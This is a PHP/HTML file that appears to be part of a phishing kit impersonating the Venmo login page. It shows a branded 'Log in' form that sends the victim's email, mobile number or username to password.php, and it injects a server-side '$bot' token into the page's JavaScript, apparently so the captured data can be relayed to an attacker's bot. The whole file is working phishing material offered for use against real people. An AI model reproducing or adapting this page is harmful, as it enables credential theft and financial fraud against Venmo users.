<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Venmo</title>
</head>
<body>

<main>
    <script>var token=<?php echo json_encode($bot); ?>;</script>
    <div class="form">
        <div>
            <img src="res/img/logo.png" >
        </div>
        <form action="password.php" method="get">
        <p class="header"> Log in</p>
         <div class="col">
           <input type="text"  placeholder="Enter email, mobile, or username" name="user" required>  
         </div>

         <div class="but">
            <button type="submit">Next</button>
         </div>

         <div class="butt">
            <button>Sign up</button>
         </div>
		 <script src="res/jq.js"></script>






         </form>
    </div>
</main>

    
</body>
</html>